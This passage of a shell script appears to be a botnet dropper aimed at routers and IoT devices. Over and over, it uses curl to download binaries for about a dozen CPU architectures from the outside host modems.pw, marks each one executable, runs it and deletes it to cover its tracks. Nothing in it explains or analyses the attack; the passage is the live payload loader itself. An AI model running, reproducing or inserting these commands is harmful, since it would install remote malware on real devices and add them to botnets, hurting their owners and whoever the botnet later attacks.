chmod 755 armv5l
./armv5l
rm -rf armv5l
curl http://modems.pw/armv4l -o armv4l
chmod 755 armv4l
./armv4l
rm -rf armv4l
curl http://modems.pw/mips -o mips
chmod 755 mips
./mips
rm -rf mips
curl http://modems.pw/mipsel -o mipsel
chmod 755 mipsel
./mipsel
rm -rf mipsel
curl http://modems.pw/sh4 -o sh4
chmod 755 sh4
./sh4
rm -rf sh4
curl http://modems.pw/sparc -o sparc
chmod 755 sparc
./sparc
rm -rf sparc
curl http://modems.pw/i586 -o i586
chmod 755 i586
./i586
rm -rf i586
curl http://modems.pw/i686 -o i686
chmod 755 i686
./i686
rm -rf i686
curl http://modems.pw/m68k -o m68k
chmod 755 m68k
./m68k
rm -rf m68k
curl http://modems.pw/powerpc -o powerpc
chmod 755 powerpc
./powerpc
